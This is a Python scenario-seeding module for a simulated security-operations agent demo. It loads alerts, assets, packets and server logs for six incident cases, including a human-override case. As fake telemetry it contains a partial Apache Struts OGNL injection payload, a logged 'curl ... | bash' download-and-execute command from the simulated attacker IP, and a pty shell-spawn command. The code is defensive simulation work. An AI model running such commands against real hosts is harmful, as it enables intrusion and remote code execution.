import json
import datetime
from typing import Dict, Any, List
from sqlalchemy.orm import Session
from backend.database.models import (
    Alert, Asset, Vulnerability, PacketMetadata, ServerLog,
    FirewallRule, Incident, EvidenceRecord, InvestigationState,
    ToolCall, ActionRecord, HumanOverride, ScenarioEvent
)

SCENARIOS = {
    "01": {
        "id": "01",
        "name": "01 — SUCCESSFUL EXPLOIT",
        "description": "NIDS triggers on Apache Struts RCE. Host is unpatched, weaponized OGNL packet is detected, and server process execution confirms compromise. Automated block and verification executed.",
        "alert_signature": "ET EXPLOIT Apache Struts RCE (CVE-2017-5638) Content-Type",
        "severity": "CRITICAL",
        "source_ip": "10.0.0.25",
        "target_ip": "10.0.0.10",
        "target_port": 8080,
        "service": "Apache Struts",
        "version": "2.3.30",
        "cve_id": "CVE-2017-5638",
        "exploit_indicators": "OGNL_INJECTION_DETECTED, MEM_ACCESS_OVERRIDE, REVERSE_SHELL_PAYLOAD",
        "has_execution": True,
        "expect_outcome": "ATTACK_VERIFIED",
        "expect_block": True
    },
    "02": {
        "id": "02",
        "name": "02 — FAILED EXPLOIT",
        "description": "NIDS triggers on malicious exploit traffic. However, target application is patched (Struts 2.5.26) and server responded with HTTP 403 Forbidden with zero process execution. Correlated attack failed.",
        "alert_signature": "ET EXPLOIT Possible Apache Struts Remote Code Execution Attempt",
        "severity": "HIGH",
        "source_ip": "198.51.100.44",
        "target_ip": "10.0.0.10",
        "target_port": 8080,
        "service": "Apache Struts",
        "version": "2.5.26",
        "cve_id": "CVE-2017-5638",
        "exploit_indicators": "EXPLOIT_ATTEMPT_DROPPED_BY_APP",
        "has_execution": False,
        "expect_outcome": "ATTACK_FAILED",
        "expect_block": False
    },
    "03": {
        "id": "03",
        "name": "03 — FALSE POSITIVE",
        "description": "NIDS signature triggered by automated security scanner benchmark. Asset is static Nginx web frontend with zero vulnerabilities and benign request payload. Case closed as benign.",
        "alert_signature": "SURICATA-SIM Anomalous HTTP Request Header Structure",
        "severity": "MEDIUM",
        "source_ip": "172.16.8.105",
        "target_ip": "10.0.0.12",
        "target_port": 80,
        "service": "Nginx Web Server",
        "version": "1.24.0",
        "cve_id": "NONE",
        "exploit_indicators": "BENIGN_SYNTHETIC_BENCHMARK_PROBE",
        "has_execution": False,
        "expect_outcome": "FALSE_POSITIVE",
        "expect_block": False
    },
    "04": {
        "id": "04",
        "name": "04 — DELAYED EVIDENCE (JUDGE DEMO)",
        "description": "Initial telemetry appears inconclusive or benign. Judge triggers 'INJECT DELAYED EVIDENCE' to simulate a late-arriving post-exploitation log. Agent dynamically reopens incident and reassesses verdict to ATTACK_VERIFIED.",
        "alert_signature": "SURICATA-SIM Suspicious Inbound Command Probe",
        "severity": "HIGH",
        "source_ip": "10.0.0.25",
        "target_ip": "10.0.0.10",
        "target_port": 8080,
        "service": "Apache Struts",
        "version": "2.3.30",
        "cve_id": "CVE-2017-5638",
        "exploit_indicators": "SUSPICIOUS_PROBE_ENCODING",
        "has_execution": False, # Starts false, toggles true when delayed evidence is injected
        "expect_outcome": "ATTACK_VERIFIED", # Post reassessment
        "expect_block": True
    },
    "05": {
        "id": "05",
        "name": "05 — RESPONSE FAILURE & RETRY",
        "description": "Verified critical exploit triggers simulated firewall block. Perimeter edge agent encounters simulated failure. Agent's active verification probe detects failure, replans, retries with secondary perimeter rule, and confirms verification.",
        "alert_signature": "ET EXPLOIT Apache Struts Remote Code Execution Attempt",
        "severity": "CRITICAL",
        "source_ip": "192.0.2.77",
        "target_ip": "10.0.0.10",
        "target_port": 8080,
        "service": "Apache Struts",
        "version": "2.3.30",
        "cve_id": "CVE-2017-5638",
        "exploit_indicators": "OGNL_INJECTION_DETECTED, SHELLCODE_DETECTED",
        "has_execution": True,
        "simulate_firewall_failure": True,
        "expect_outcome": "ATTACK_VERIFIED",
        "expect_block": True
    },
    "06": {
        "id": "06",
        "name": "06 — HUMAN OVERRIDE",
        "description": "Agent confirms exploitation and recommends an immediate IP block. Security Analyst intervenes via human-in-the-loop control to OVERRIDE the block. Agent respects override, logs analyst rationale, and withholds action.",
        "alert_signature": "ET EXPLOIT Critical RCE on Core Production Service",
        "severity": "CRITICAL",
        "source_ip": "10.0.0.99",
        "target_ip": "10.0.0.10",
        "target_port": 8080,
        "service": "Apache Struts",
        "version": "2.3.30",
        "cve_id": "CVE-2017-5638",
        "exploit_indicators": "OGNL_INJECTION_DETECTED",
        "has_execution": True,
        "expect_outcome": "ATTACK_VERIFIED",
        "expect_block": False # Overridden
    }
}

class ScenarioManager:
    def __init__(self, db: Session):
        self.db = db

    def reset_and_seed(self, scenario_id: str = "01") -> Dict[str, Any]:
        """
        Clears existing simulation state and loads the specified scenario.
        """
        if scenario_id not in SCENARIOS:
            scenario_id = "01"
        cfg = SCENARIOS[scenario_id]

        # Reset tables
        self.db.query(Alert).delete()
        self.db.query(Asset).delete()
        self.db.query(Vulnerability).delete()
        self.db.query(PacketMetadata).delete()
        self.db.query(ServerLog).delete()
        self.db.query(FirewallRule).delete()
        self.db.query(Incident).delete()
        self.db.query(InvestigationState).delete()
        self.db.query(EvidenceRecord).delete()
        self.db.query(ToolCall).delete()
        self.db.query(ActionRecord).delete()
        self.db.query(HumanOverride).delete()
        self.db.query(ScenarioEvent).delete()
        self.db.commit()

        # Seed Vulnerabilities catalog
        v1 = Vulnerability(
            cve_id="CVE-2017-5638",
            service_name="Apache Struts",
            affected_versions="2.3.5-2.3.31, 2.5-2.5.10",
            cvss_score=9.8,
            severity="CRITICAL",
            description="Remote Code Execution vulnerability in Jakarta Multipart parser of Apache Struts.",
            exploit_available=True
        )
        v2 = Vulnerability(
            cve_id="CVE-2021-44228",
            service_name="Log4j",
            affected_versions="2.0-beta9 to 2.14.1",
            cvss_score=10.0,
            severity="CRITICAL",
            description="JNDI lookup code execution flaw in Apache Log4j2.",
            exploit_available=True
        )
        self.db.add_all([v1, v2])

        # Seed Assets
        a1 = Asset(
            ip="10.0.0.10",
            hostname="web-server-01.aegis.internal",
            os="Ubuntu Linux 22.04 LTS",
            running_service=cfg["service"] if cfg["target_ip"] == "10.0.0.10" else "Apache Struts",
            service_version=cfg["version"] if cfg["target_ip"] == "10.0.0.10" else "2.3.30",
            port=8080,
            criticality="HIGH",
            owner="SecOps Core Team",
            environment="Production"
        )
        a2 = Asset(
            ip="10.0.0.12",
            hostname="nginx-edge-02.aegis.internal",
            os="Alpine Linux 3.19",
            running_service="Nginx Web Server",
            service_version="1.24.0",
            port=80,
            criticality="MEDIUM",
            owner="DevOps Platform Team",
            environment="DMZ"
        )
        self.db.add_all([a1, a2])

        # Seed Alert
        alert_id = f"ALT-{scenario_id}-9942"
        alert = Alert(
            id=alert_id,
            timestamp=datetime.datetime.utcnow(),
            rule_id=f"SURICATA-RULE-{scenario_id}002",
            signature=cfg["alert_signature"],
            category="Exploit / Remote Code Execution" if "EXPLOIT" in cfg["alert_signature"] else "Anomalous Traffic",
            severity=cfg["severity"],
            source_ip=cfg["source_ip"],
            target_ip=cfg["target_ip"],
            target_port=cfg["target_port"],
            raw_payload=f"POST /orders/process.action HTTP/1.1\\r\\nHost: {cfg['target_ip']}:{cfg['target_port']}\\r\\nContent-Type: %{{(#_='multipart/form-data')}}",
            scenario_id=scenario_id
        )
        self.db.add(alert)

        # Seed Packet Metadata
        pkt = PacketMetadata(
            id=f"PKT-{scenario_id}-01",
            alert_id=alert_id,
            protocol="TCP",
            source_ip=cfg["source_ip"],
            target_ip=cfg["target_ip"],
            target_port=cfg["target_port"],
            packet_size=1460,
            payload_sample="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" if "OGNL" in cfg["exploit_indicators"] else "GET /healthz HTTP/1.1 Host: 10.0.0.12 User-Agent: AegisBenchmark/1.0",
            flags="[PSH, ACK]",
            indicators=cfg["exploit_indicators"]
        )
        self.db.add(pkt)

        # Seed Server Logs
        if cfg["has_execution"]:
            l1 = ServerLog(
                id=f"LOG-{scenario_id}-01",
                asset_ip=cfg["target_ip"],
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(seconds=4),
                event_type="http_request",
                process_name="java",
                command_line="/usr/bin/java -jar struts2-orders.jar",
                http_status=200,
                details="POST /orders/process.action HTTP 200 OK 412ms",
                is_delayed=False
            )
            l2 = ServerLog(
                id=f"LOG-{scenario_id}-02",
                asset_ip=cfg["target_ip"],
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(seconds=2),
                event_type="process_creation",
                process_name="cmd_simulated",
                command_line="/bin/sh -c 'whoami; curl -s http://10.0.0.25/stg.sh | bash'",
                http_status=None,
                details="Parent process java (PID 4110) spawned shell process (PID 4992)",
                is_delayed=False
            )
            self.db.add_all([l1, l2])
        elif scenario_id == "02": # Failed exploit
            l1 = ServerLog(
                id=f"LOG-{scenario_id}-01",
                asset_ip=cfg["target_ip"],
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(seconds=5),
                event_type="http_request",
                process_name="java",
                command_line="/usr/bin/java -jar struts2-patched.jar",
                http_status=403,
                details="POST /orders/process.action HTTP 403 Forbidden - Content-Type validation rejected payload",
                is_delayed=False
            )
            self.db.add(l1)
        elif scenario_id == "04": # Delayed evidence scenario: normal at first, delayed log seeded
            l1 = ServerLog(
                id=f"LOG-{scenario_id}-01",
                asset_ip=cfg["target_ip"],
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(seconds=8),
                event_type="http_request",
                process_name="java",
                command_line="/usr/bin/java -jar struts2-orders.jar",
                http_status=200,
                details="POST /orders/process.action HTTP 200 OK (inconclusive payload evaluation)",
                is_delayed=False
            )
            # Delayed telemetry waiting to be injected
            l_delayed = ServerLog(
                id=f"LOG-{scenario_id}-DELAYED-01",
                asset_ip=cfg["target_ip"],
                timestamp=datetime.datetime.utcnow(),
                event_type="process_creation",
                process_name="cmd_simulated",
                command_line="/bin/sh -c 'python3 -c import pty; pty.spawn(\"/bin/bash\")'",
                http_status=None,
                details="DELAYED TELEMETRY: Host EDR reported reverse interactive shell spawning on target asset",
                is_delayed=True
            )
            self.db.add_all([l1, l_delayed])
        else: # Normal benign
            l1 = ServerLog(
                id=f"LOG-{scenario_id}-01",
                asset_ip=cfg["target_ip"],
                timestamp=datetime.datetime.utcnow() - datetime.timedelta(seconds=12),
                event_type="http_request",
                process_name="nginx",
                command_line="/usr/sbin/nginx -g 'daemon on;'",
                http_status=200,
                details="GET /index.html HTTP 200 OK 2ms",
                is_delayed=False
            )
            self.db.add(l1)

        # Seed Initial Incident
        inc_id = f"INC-{scenario_id}-1001"
        inc = Incident(
            id=inc_id,
            alert_id=alert_id,
            scenario_id=scenario_id,
            title=f"Investigation: {cfg['alert_signature']}",
            stage="INTAKE",
            status="ACTIVE",
            initial_assessment="PENDING_EVALUATION",
            current_assessment="UNCERTAIN",
            confidence=0,
            reasoning_summary="Alert ingested. Autonomous agent initialized to observe evidence and assess knowledge gaps.",
            target_asset_ip=cfg["target_ip"],
            attacker_ip=cfg["source_ip"],
            created_at=datetime.datetime.utcnow()
        )
        self.db.add(inc)

        # Record Scenario Seed Event
        evt = ScenarioEvent(
            scenario_id=scenario_id,
            name=f"LOAD_{scenario_id}",
            description=f"Loaded scenario: {cfg['name']}",
            state_json=json.dumps(cfg)
        )
        self.db.add(evt)

        self.db.commit()

        return {
            "scenario": cfg,
            "incident_id": inc_id,
            "alert_id": alert_id
        }

    def inject_delayed_evidence(self, scenario_id: str = "04") -> Dict[str, Any]:
        """
        Judge Demo trigger: Changes environment by activating the delayed server log.
        """
        delayed_logs = self.db.query(ServerLog).filter(ServerLog.is_delayed == True).all()
        count = 0
        for l in delayed_logs:
            l.is_delayed = False
            l.timestamp = datetime.datetime.utcnow()
            count += 1

        self.db.commit()

        return {
            "scenario_id": scenario_id,
            "delayed_logs_activated": count,
            "message": f"Successfully injected {count} delayed server-side post-exploitation telemetry events into asset environment."
        }
